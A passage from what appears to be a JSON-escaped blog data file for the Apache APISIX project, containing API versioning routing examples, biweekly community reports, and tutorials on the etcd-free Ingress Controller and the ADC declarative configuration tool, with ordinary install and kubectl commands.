3                               #1\\n  - uri: /*                                   #1-3\\n    upstream_id: 1\\n    priority: 1\\n```\\n\\n1. Both routes match the same URI, so we must evaluate them in order. That\'s the role of `priority`: Apache APISIX evaluates the highest priority first\\n2. Evaluate the query parameter named `version`\\n3. Default route when no `version` is provided. Here, I route to version 1, but you can also return an HTTP status `4xx` to require a version.\\n\\n## Header-based versioning\\n\\nThe last alternative for versioning is to use HTTP headers. Here\'s a custom header:\\n\\n```http\\nGET / HTTP1.1\\n\\nVersion: 1\\n```\\n\\nFrom an HTTP point of view, asking for a version via a header is the definition of _content negotiation_ between the client and the server:\\n\\n>Content negotiation refers to mechanisms defined as a part of HTTP that make it possible to serve different versions of a document (or more generally, representations of a resource) at the same URI, so that user agents can specify which version fits their capabilities the best.\\n>\\n>-- [Content Negotiation on Wikipedia](https://en.wikipedia.org/wiki/Content_negotiation)\\n\\nThe agreed-upon content type format follows the pattern `application/vnd.aaa.bbb.vX+format`, where:\\n\\n* `aaa.bbb` is a reversed domain name, _e.g._, `ch.frankel`\\n* `X` is the version number, _e.g._, `1`\\n* `format` is the accepted format, _e.g._, `json`\\n\\nHence, here\'s a possible request:\\n\\n```http\\nGET / HTTP1.1\\n\\nAccept: application/vnd.ch.frankel.myservice.v1+json\\n```\\n\\nTheoretically, the client can leverage the *quality*  of `Accept` headers to communicate that it can handle different versions. The following request tells that the client prefers version 2 but can handle version 1 if the need be:\\n\\n```http\\nGET / HTTP1.1\\n\\nAccept: application/vnd.ch.frankel.myservice.v2+json;q=0.8, application/vnd.ch.frankel.myservice.v1+json;q=0.2\\n```\\n\\nIn practice, quality requires a high level of maturity, both on the server-side - handling qualities and on the client-side - handling two versions simultaneously.\\n\\nHere\'s the APISIX configuration for quality-less content negotiation. It\'s very similar to the one above, the only difference being the Nginx variable in play, `http_X` instead of `arg_Y`.\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream_id: 1\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v1+json\\" ]]\\n    priority: 2\\n  - uri: /*\\n    upstream_id: 2\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v2+json\\" ]]\\n    priority: 3\\n  - uri: /*\\n    upstream_id: 1\\n    priority: 1\\n```\\n\\n## Conclusion\\n\\nIn this short post, we detailed the three options for versioning HTTP APIs: path-based, query-based, and header-based. They don\'t differ much, each having its little tricky parts. Whatever path you choose, though, make sure it\'s consistent across all the organization.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/api-versioning).\\n\\n**To go further:**\\n\\n* [API deployment strategies](https://navendu.me/posts/api-deployment-strategies/)\\n* [Content Negotiation in RFC 9110](https://www.rfc-editor.org/rfc/rfc9110.html#name-content-negotiation)\\n* [Routing in Apache APISIX](https://apisix.apache.org/docs/apisix/router-radixtree/)"},{"id":"Biweekly Report (October 23 - November 05)","metadata":{"permalink":"/blog/2023/11/08/bi-weekly-report","source":"@site/blog/2023/11/08/bi-weekly-report.md","title":"Biweekly Report (October 23 - November 05)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2023-11-08T00:00:00.000Z","formattedDate":"November 8, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.665,"truncated":true,"authors":[],"prevItem":{"title":"API versioning","permalink":"/blog/2023/11/09/api-versioning"},"nextItem":{"title":"Biweekly Report (October 09 - October 22)","permalink":"/blog/2023/10/26/bi-weekly-report"}},"content":"> We have recently made some fixes and improvements to specific features within Apache APISIX. These updates include supporting variable export for the `zipkin` plugin and switching install-dependencies from apisix-base to apisix-runtime. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 10.23 to 11.05, a total of 20 contributors made 31 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently addressed and enhanced various features, and here is a summary of the updates:\\n\\n1. Support variable export for the `zipkin` plugin\\n  \\n2. Switch install-dependencies from apisix-base to apisix-runtime\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/11/06/KIq2vqua_11.06-Contributors.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/11/06/YPE25fUK_11.06-New.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Support variable export for the `zipkin` plugin](https://github.com/apache/apisix/pull/10361) (Contributor: [wizhuo](https://github.com/wizhuo))\\n\\n- [Switch install-dependencies apisix-base to apisix-runtime](https://github.com/apache/apisix/pull/10427) (Contributor: [Sn0rt](https://github.com/Sn0rt))\\n\\n## Recent Blog Recommendations\\n\\n- [Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency](https://apisix.apache.org/blog/2023/10/18/ingress-apisix/)\\n\\n  The innovative architecture of the APISIX Ingress Controller eliminates the dependency on a standalone etcd cluster, greatly simplifying maintenance costs and system complexity.\\n\\n- [Embracing GitOps: APISIX\'s New Feature for Declarative Configuration](https://apisix.apache.org/blog/2023/10/07/apisix-gitops-adc/)\\n\\n  APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Biweekly Report (October 09 - October 22)","metadata":{"permalink":"/blog/2023/10/26/bi-weekly-report","source":"@site/blog/2023/10/26/bi-weekly-report.md","title":"Biweekly Report (October 09 - October 22)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2023-10-26T00:00:00.000Z","formattedDate":"October 26, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.07,"truncated":true,"authors":[],"prevItem":{"title":"Biweekly Report (October 23 - November 05)","permalink":"/blog/2023/11/08/bi-weekly-report"},"nextItem":{"title":"Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency","permalink":"/blog/2023/10/18/ingress-apisix"}},"content":"> We have recently made some fixes and improvements to specific features within Apache APISIX. These updates include upgrading lua-resty-healthcheck to version 3.2.0, adding support for configuring services in stream route, enhancing `authz-keycloak` plugin to support encryption using secrets, and updating the `openid-connect` plugin to support authorization_params. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 10.09 to 10.22, a total of 21 contributors made 37 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently addressed and enhanced various features, and here is a summary of the updates:\\n\\n1. Upgrade lua-resty-healthcheck to version 3.2.0\\n\\n2. Add support for configuring services in stream routes\\n\\n3. Enhance `authz-keycloak` plugin to support encryption using secrets\\n\\n4. Update the `openid-connect` plugin to support authorization_params\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/10/23/2nDl86Bc_All-poster.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/10/27/iEMZzOhZ_New-poster.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Upgrade lua-resty-healthcheck to version 3.2.0](https://github.com/apache/apisix/pull/10307) (Contributor: [monkeyDluffy6017](https://github.com/monkeyDluffy6017))\\n\\n- [Add support for configuring services in stream routes](https://github.com/apache/apisix/pull/10298) (Contributor: [lingsamuel](https://github.com/lingsamuel))\\n\\n- [Enhance `authz-keycloak` plugin to support encryption using secrets](https://github.com/apache/apisix/pull/10353) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\n- [Update the `openid-connect` plugin to support authorization_params](https://github.com/apache/apisix/pull/10058) (Contributor: [TrevorSmith-msr](https://github.com/TrevorSmith-msr))\\n\\n## Recent Blog Recommendations\\n\\n- [Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency](https://apisix.apache.org/blog/2023/10/18/ingress-apisix/)\\n\\n  The innovative architecture of the APISIX Ingress Controller eliminates the dependency on a standalone etcd cluster, greatly simplifying maintenance costs and system complexity.\\n\\n- [Embracing GitOps: APISIX\'s New Feature for Declarative Configuration](https://apisix.apache.org/blog/2023/10/07/apisix-gitops-adc/)\\n\\n  APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.\\n\\n- [Coraza: Elevating APISIX with Cutting-Edge WAF Features](https://apisix.apache.org/blog/2023/09/08/APISIX-integrates-with-Coraza/)\\n\\n  The integration of APISIX and Coraza provides reliable security protection and ensures the integrity and reliability of API services.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency","metadata":{"permalink":"/blog/2023/10/18/ingress-apisix","source":"@site/blog/2023/10/18/ingress-apisix.md","title":"Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency","description":"The innovative architecture of the APISIX Ingress Controller eliminates the dependency on a standalone etcd cluster, greatly simplifying maintenance costs and system complexity.","date":"2023-10-18T00:00:00.000Z","formattedDate":"October 18, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":6.475,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://github.com/AlinsRan.png","imageURL":"https://github.com/AlinsRan.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (October 09 - October 22)","permalink":"/blog/2023/10/26/bi-weekly-report"},"nextItem":{"title":"Biweekly Report (September 25 - October 08)","permalink":"/blog/2023/10/11/bi-weekly-report"}},"content":"> The innovative architecture of the APISIX Ingress Controller eliminates the dependency on a standalone etcd cluster, greatly simplifying maintenance costs and system complexity.\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nAPISIX Ingress Controller is a Kubernetes Ingress Controller based on Apache APISIX. It has the capability to convert Ingress/CRDs resources from Kubernetes into routing rules for Apache APISIX, synchronizing them with the Apache APISIX cluster. As a result, users can harness the robust functionalities of Apache APISIX, including plugins, load balancing, health checks, and more, for the management of inbound traffic in Kubernetes.\\n\\n![APISIX Ingress Controller Architecture](https://static.apiseven.com/uploads/2023/10/24/aezup4a9_APISIX-Ingress-1.png)\\n\\n![Architecture of APISIX Ingress Controller with Gateway API](https://static.apiseven.com/uploads/2023/10/24/ZtjVM6dH_APISIX-Ingress-2.png)\\n\\nIn previous versions, deploying an APISIX Ingress Controller cluster necessitated the additional maintenance of a highly available etcd cluster. In practice, it proved to be less user-friendly and posed several challenges:\\n\\n1. **High Maintenance Costs for the etcd Cluster**: Setting up a highly available cluster involves significant learning and maintenance costs, including system resource consumption like memory. Deploying an etcd cluster in Kubernetes requires careful attention to various factors, often leading to challenges for those unfamiliar with etcd, and necessitating concerns about memory and other system resource consumption.\\n\\n2. **High Utilization Costs**: Deploying an APISIX Ingress Controller cluster entails three components. Compared to a single-component ingress-nginx, the APISIX Ingress Controller demands higher learning and debugging costs. It is notably less straightforward to use, presenting an additional burden for first-time users.\\n\\n3. **Data Redundancy and Inconsistency**: Both Kubernetes etcd and APISIX etcd clusters retain a copy of the data. During usage, efforts are often needed to prevent discrepancies between the two datasets. Due to APISIX and the Ingress controller being decoupled, addressing and mitigating such situations becomes challenging.\\n\\n4. **Obstacles in Implementing Gateway API**: The Gateway API dynamically manages the full lifecycle of a set of Gateways (APISIX).  Because APISIX configuration primarily stems from etcd, the Ingress Controller must simultaneously monitor the etcd clusters and APISIX, which makes maintenance and management very complicated.\\n\\nIn the overall architecture, Apache APISIX does not rely on the Ingress Controller. The Ingress Controller performs the role of pushing configuration but lacks the ability to manage APISIX effectively. These issues are challenging to address within the existing architecture. **To tackle these challenges and provide solutions, a new APISIX Ingress Controller architecture needs to be designed.**\\n\\n## Design of New Architecture\\n\\nTo address the issues in the existing architecture, it is necessary to remove the etcd component. Currently, we are considering two main approaches:\\n\\n1. **Rendering the `apisix.yaml` configuration file**: Generate `apisix.yaml` configuration files based on the CRD. APISIX, in YAML deployment mode, periodically reads the entire `apisix.yaml` configuration file every second.\\n\\n2. **Simulating the etcd server API**: Building a KV in-memory database based on the CRD and simulating the etcd server API for use by APISIX. APISIX will attempt to watch the resource configurations provided by the Controller and notify all APISIX instances.\\n\\nClearly, the first approach is simpler, but it is not suitable for scenarios where the gateway directly connects to backend Pods. The reason is that in Kubernetes, Pod IPs have dynamic scalability features, and the Ingress Controller generates the `apisix.yaml` configuration continuously.\\n\\nThis causes the APISIX routing tree to be rebuilt frequently, causing long-term performance jitter. Finally, after discussion, the APISIX community decided to adopt the second option. Its architecture is shown in the figure below:\\n\\n![Architecture of New APISIX Ingress Controller](https://static.apiseven.com/uploads/2023/10/24/H7xooJ59_APISIX-Ingress-3.png)\\n\\n![Architecture of New APISIX Ingress Controller (HA)](https://static.apiseven.com/uploads/2023/10/24/UbKWYGar_APISIX-Ingress-4.png)\\n\\nAPISIX Ingress Controller implements a new architecture in Release v1.7.0, which has the following advantages:\\n\\n- **Sole reliance on declarative configuration**: APISIX will exclusively rely on the configuration information provided by the Control Plane and take it as the sole source. This approach, commonly used in Kubernetes, greatly reduces operational complexity.\\n\\n- **No need to maintain a separate etcd cluster**: The new architecture eliminates the dependency on a standalone etcd cluster. This significantly reduces maintenance costs and complexity for users, making it easier to deploy and use.\\n\\n- **Advancement of the Kubernetes Gateway API standard**: APISIX relies on the Ingress Controller and enables it to manage the lifecycle of the gateway. This contributes to the complete implementation of the Gateway API.\\n\\n## Ideal Architecture for Gateway API\\n\\nGateway API is the next-generation version of the Ingress API, offering enhanced functionality and expressiveness. Currently, Gateway API has gained support from numerous vendors and projects. As one of the implementers of Gateway API, APISIX Ingress Controller not only adheres to the standard specifications of Gateway API but also combines the rich features of Apache APISIX to provide users with a broader range of gateway configurations and policy options.\\n\\nThe implementation of the new architecture further advances the realization of Gateway API, enabling better routing configuration and policies while reducing maintenance costs. This makes it easier to deploy and use, while also leveraging the advantages of Gateway API to improve the management efficiency of the API gateway.\\n\\n![Gateway API](https://static.apiseven.com/uploads/2023/10/17/9n1XraKT_Ingress-APISIX-5.png)\\n\\n## How to Deploy and Use the New APISIX Ingress Controller\\n\\nIn this chapter, we will explain the high-available installation and deployment of APISIX Ingress Controller in Kubernetes, and demonstrate how to configure `ApisixRoute` to access the `httpbin` application service in an example.\\n\\n### Install APISIX Ingress Controller\\n\\n1. You can run the following command to clone the APISIX source code from Github:\\n\\n```shell\\ngit clone --depth 1 --branch 1.7.0 https://github.com/apache/apisix-ingress-controller.git ingress-apisix-1.7.0\\n\\ncd ingress-apisix-1.7.0\\n```\\n\\n2. Install CRDs\\n\\n```shell\\nkubectl apply -k samples/deploy/crd/v1/\\n```\\n\\n3. Install APISIX Ingress Controller\\n\\n```shell\\nkubectl apply -f samples/deploy/composite.yaml\\n```\\n\\n4. Check deployment status\\n\\n- Check service\\n\\n  ```shell\\n  kubectl get service  -n ingress-apisix # check service\\n  ```\\n\\n  ```shell\\n  NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                      AGE\\n  ingress-apisix-gateway      NodePort    10.99.236.58     <none>        80:31143/TCP,443:30166/TCP   90s\\n  ```\\n\\n- Check pods\\n\\n  ```shell\\n  kubectl get pods -n ingress-apisix # check pod\\n  ```\\n\\n  ```shell\\n  NAME                                                 READY   STATUS    RESTARTS   AGE\\n  ingress-apisix-composite-deployment-5df9bc99c7-xxpvq   2/2     Running   0          100s\\n  ```\\n\\n### Highly Available Deployment\\n\\n- Deploy 3 instances and you can achieve high availability by configuring [replicas](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/).\\n\\n```shell\\n kubectl scale deployment ingress-apisix-composite-deployment --replicas=3 -n ingress\\n-apisix\\n```\\n\\n- Check deployment status\\n\\n```shell\\nkubectl get pods -n ingress-apisix\\n```\\n\\n```shell\\n\\nNAME                                                   READY   STATUS    RESTARTS   AGE\\ningress-apisix-composite-deployment-6bfdc5d6f6-gjgql   2/2     Running   0          20s\\ningress-apisix-composite-deployment-6bfdc5d6f6-jb24q   2/2     Running   0          20s\\ningress-apisix-composite-deployment-6bfdc5d6f6-sjpzr   2/2     Running   0          45h\\n```\\n\\n### Example of Usage\\n\\n> ApisixRoute is the CRDs resource of Ingress, used to represent routing traffic to specific backend services.\\n\\nThe following example shows how to configure `ApisixRoute` to route traffic to the `httpbin` backend service.\\n\\n#### Deploy httpbin Application Service\\n\\n- Deploy `httpbin` application service and configure `ApisixRoute`:\\n\\n```shell\\nkubectl apply -f samples/httpbin/httpbin-route.yaml\\n```\\n\\n- The specific `ApisixRoute` configuration is as follows:\\n\\n  All requests with `Host: httpbin.org` will be routed to the `httpbin` service\\n\\n  ```YAML\\n  apiVersion: apisix.apache.org/v2\\n  kind: ApisixRoute\\n  metadata:\\n    name: httpbin-route\\n  spec:\\n    http:\\n      - name: route-1\\n        match:\\n          hosts:\\n            - httpbin.org\\n          paths:\\n            - /*\\n        backends:\\n          - serviceName: httpbin\\n            servicePort: 80\\n  ```\\n\\n#### Visit httpbin Test\\n\\nAccess the `ingress-apisix-gateway` service through local port forwarding, and requests will be routed from ingress-apisix-gateway to the httpbin application.\\n\\n```Bash\\n# forward port 9080 -> service 80\\nkubectl port-forward service/ingress-apisix-gateway 9080:80 -n ingress-apisix &\\n\\n# acesss httpbin\\ncurl http://127.0.0.1:9080/headers -H \'Host: httpbin.org\'\\n```\\n\\n```Bash\\n{\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.74.0\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  }\\n}\\n```\\n\\n## Summary\\n\\nWe thoroughly discussed the innovative architecture of the APISIX Ingress Controller, liberating it from dependency on the etcd cluster. This greatly simplifies maintenance costs and system complexity. Simultaneously, the APISIX Ingress Controller actively advances the implementation of the Kubernetes Gateway API standard within the Ingress Controller, aiming to provide more extensive and consistent traffic management capabilities.\\n\\nIn conclusion, whether it be the new architecture of APISIX Ingress Controller or the implementation of the Kubernetes Gateway API, the goal is to offer users a more robust, flexible, and user-friendly Ingress Controller solution to meet the ever-changing demands of cloud-native application deployment and traffic management."},{"id":"Biweekly Report (September 25 - October 08)","metadata":{"permalink":"/blog/2023/10/11/bi-weekly-report","source":"@site/blog/2023/10/11/bi-weekly-report.md","title":"Biweekly Report (September 25 - October 08)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2023-10-11T00:00:00.000Z","formattedDate":"October 11, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.985,"truncated":true,"authors":[],"prevItem":{"title":"Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency","permalink":"/blog/2023/10/18/ingress-apisix"},"nextItem":{"title":"Embracing GitOps: APISIX\'s New Feature for Declarative Configuration","permalink":"/blog/2023/10/07/apisix-gitops-adc"}},"content":"> We have recently made some fixes and improvements to specific features within Apache APISIX. These updates include adding support for the specified resolv.conf file in DNS service discovery, enabling the `traffic-split` plugin to work with HTTPS, and introducing ACL token support for Consul service discovery. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 9.25 to 10.08, a total of 22 contributors made 43 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently addressed and enhanced various features, and here is a summary of the updates:\\n\\n1. Add support for the specified resolv.conf file in DNS service discovery\\n\\n2. Enable the `traffic-split` plugin to work with HTTPS\\n\\n3. Introduce ACL token support for Consul service discovery\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/10/09/1r8sLlzK_LIST.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/10/09/xO6LPFNm_NEW.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Add support for the specified resolv.conf file in DNS service discovery](https://github.com/apache/apisix/pull/9770) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\n- [Enable the `traffic-split` plugin to work with HTTPS](https://github.com/apache/apisix/pull/9115) (Contributor: [TenYearsIn](https://github.com/TenYearsIn))\\n\\n- [Introduce ACL token support for Consul service discovery](https://github.com/apache/apisix/pull/10278) (Contributor: [sevensolutions](https://github.com/sevensolutions))\\n\\n## Recent Blog Recommendations\\n\\n- [Embracing GitOps: APISIX\'s New Feature for Declarative Configuration](https://apisix.apache.org/blog/2023/10/07/apisix-gitops-adc/)\\n\\n  APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.\\n\\n- [Release Apache APISIX 3.6.0](https://apisix.apache.org/blog/2023/10/05/release-apache-apisix-3.6.0/)\\n\\n  We are glad to present Apache APISIX 3.6.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n- [Resizing images on-the-fly](https://apisix.apache.org/blog/2023/10/05/resize-images-on-the-fly/)\\n\\n  As a web architect, one of the many issues is asset management. And the most significant issue in assets is images.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Embracing GitOps: APISIX\'s New Feature for Declarative Configuration","metadata":{"permalink":"/blog/2023/10/07/apisix-gitops-adc","source":"@site/blog/2023/10/07/apisix-gitops-adc.md","title":"Embracing GitOps: APISIX\'s New Feature for Declarative Configuration","description":"APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.","date":"2023-10-07T00:00:00.000Z","formattedDate":"October 7, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":8.735,"truncated":true,"authors":[{"name":"Jintao Zhang","title":"Author","url":"https://github.com/tao12345666333","image_url":"https://avatars.githubusercontent.com/u/3264292?v=4","imageURL":"https://avatars.githubusercontent.com/u/3264292?v=4"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (September 25 - October 08)","permalink":"/blog/2023/10/11/bi-weekly-report"},"nextItem":{"title":"Release Apache APISIX 3.6.0","permalink":"/blog/2023/10/05/release-apache-apisix-3.6.0"}},"content":"APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.\\n\x3c!--truncate--\x3e\\n\\nWith the widespread adoption of cloud-native and microservices, the API gateway has emerged as a critical component for connecting and managing various microservices. However, as the number of services continues to grow and changes occur more frequently, the traditional imperative configuration has become increasingly challenging to manage and maintain. GitOps, on the other hand, is an operational model that leverages version control systems and automated workflows. By supporting declarative configurations, GitOps provides a more efficient, reliable, and traceable mode of operation.\\n\\nTo enhance developing efficiency and operational reliability, APISIX has introduced a new tool that supports GitOps in a declarative manner. By embracing the declarative nature of GitOps, APISIX strengthens its integration with modern development and operational workflows. This integration enables smoother collaboration between developers and operations teams, promoting efficient and reliable management of the APISIX platform.\\n\\n## Why Does APISIX Support GitOps Declarative Configuration\\n\\nAlthough APISIX offers a stand-alone mode that allows configuration through YAML files, it lacks seamless integration with related ecosystems such as CI/CD tools like Jenkins and ArgoCD. While the APISIX Ingress Controller project makes significant strides in this area, APISIX itself does not provide a comprehensive set of declarative tools to support GitOps when used in non-Kubernetes environments such as bare metal or virtual machines.\\n\\nIn traditional API gateway management, configurations and policies are typically manipulated using imperative methods, requiring manual modifications through command-line tools or management interfaces. This approach poses several challenges:\\n\\n- **Cumbersome Configuration Management**: Manual modifications of configurations are prone to errors, especially when dealing with large-scale gateways.\\n\\n- **Poor Traceability**: Tracking the change history and version control of configurations becomes difficult.\\n\\n- **Lack of Consistency**: Configuration discrepancies among multiple environments result in inconsistencies between development, testing, and production environments.\\n\\nThe APISIX development team recognized several benefits of supporting GitOps in a declarative manner to effectively address these challenges:\\n\\n1. **Improved Developer Efficiency**: By using GitOps with a declarative configuration approach, developers can directly manage API gateway configurations by modifying and committing configuration files in the code repository. This method aligns with the development workflow that developers are familiar with, reducing the learning curve and tool-switching costs, and thus enhancing developer productivity.\\n\\n2. **Enhanced Operational Reliability**: Storing configuration files in a version control system ensures consistency and reliability. Each configuration change can be traced through its change history, and it becomes easy to roll back to a previous configuration state. This function enables traceability and auditability and reduces the risk of failures caused by human errors.\\n\\n3. **Streamlined Multi-Environment Management**: Managing different configurations across development, testing, and production environments can be simplified. By utilizing GitOps, it becomes effortless to create different branches or tags for managing configuration files in different environments, ensuring consistency across environments and reducing manual configuration errors.\\n\\n4. **Facilitated Team Collaboration**: The GitOps workflow promotes collaboration and communication among team members. Developers can actively participate in the development and maintenance of API gateway configurations through practices such as submitting merge requests and code reviews, thereby improving team collaboration efficiency and code quality.\\n\\n## How Does APISIX Support GitOps Declarative Configuration\\n\\n### ADC and Its Usage Scenarios and Functions\\n\\nADC, APISIX declarative CLI, is a declarative configuration tool for APISIX. It assists users in achieving various integrations in non-Kubernetes environments using a declarative approach.\\n\\nADC allows interaction with APISIX instances through the command line and currently provides the following functionalities:\\n\\n- **Configuration of connection information**: ADC allows the configuration of the address, port, login token, and other details of the APISIX instance to connect to.\\n- **Configuration validation**: ADC provides the functionality to validate the syntax of APISIX configuration files.\\n- **Configuration synchronization**: Local configuration files can be synchronized to the APISIX instance using ADC.\\n- **Configuration export**: ADC enables the export of configuration files from the APISIX instance.\\n- **Configuration diff comparison**: ADC can compare the differences between the local configuration and the configuration on the APISIX instance.\\n- **OpenAPI conversion**: ADC can convert OpenAPI specification files into APISIX configuration files.\\n- **Runtime diagnostics**: ADC supports diagnostic commands such as ping to assist in debugging the connection between ADC and the gateway.\\n\\nIn essence, ADC provides a declarative approach to APISIX configuration and management, eliminating the need for manual calls to the admin API or using tools like the Dashboard. Instead, configuration synchronization can be achieved through simple commands.\\n\\n## How Does APISIX Use ADC for Declarative Configuration\\n\\n### Installing APISIX and ADC\\n\\nPlease refer to the [APISIX documentation](https://apisix.apache.org/docs/apisix/getting-started/README/) for installing APISIX. Once APISIX is installed, you can proceed to install the ADC binary to the `$GOPATH/bin` directory using the `go install` command.\\n\\n```shell\\ngo install github.com/api7/adc@latest\\n```\\n\\nAdd this line of code to your `$PATH` environment variable:\\n\\n```shell\\nexport PATH=$PATH:$GOPATH/bin\\n```\\n\\nIf you don\'t have Go installed, you can download the latest `adc` binary and add it to your `/bin` folder:\\n\\n```shell\\nwget https://github.com/api7/adc/releases/download/v0.2.0/adc_0.2.0_linux_amd64.tar.gz\\ntar -zxvf adc_0.2.0_linux_amd64.tar.gz\\nmv adc /usr/local/bin/adc\\n```\\n\\nYou can find binaries for other operating systems on the [releases page](https://github.com/api7/adc/releases/tag/v0.2.0). In the future, these files will be published on package management tools like Homebrew.\\n\\nRun the following code to confirm that `adc` has been installed:\\n\\n```shell\\nadc --help\\n```\\n\\nIf everything goes well, you will see a list of available subcommands and using guide.\\n\\n### Configuring ADC with APISIX Instance\\n\\nNext, configure the APISIX instance in the ADC.\\n\\n```shell\\nadc configure\\n```\\n\\nIt will prompt you to pass in the APISIX server address (\'http://127.0.0.1:9180\' if you followed along) and token. If everything is filled in correctly, you can see the following content:\\n\\n```shell\\nADC configured successfully!\\nConnected to APISIX successfully!\\n```\\n\\nYou can use the `ping` subcommand to check the APISIX connection at any time:\\n\\n```shell\\nadc ping\\n```\\n\\n### Validating APISIX Configuration Files\\n\\nCreate a basic APISIX configuration with a route that forwards traffic to upstreams:\\n\\n```yaml title=\\"config.yaml\\"\\nname: \\"Basic configuration\\"\\nversion: \\"1.0.0\\"\\nservices:\\n  - name: httpbin-service\\n    hosts:\\n      - api7.ai\\n    upstream:\\n      name: httpbin\\n      nodes:\\n        - host: httpbin.org\\n          port: 80\\n          weight: 1\\nroutes:\\n  - name: httpbin-route\\n    service_id: httpbin-service\\n    uri: \\"/anything\\"\\n    methods:\\n      - GET\\n```\\n\\nOnce the ADC is connected to the running APISIX instance, you can use it to validate this configuration before applying it by running:\\n\\n```shell\\nadc 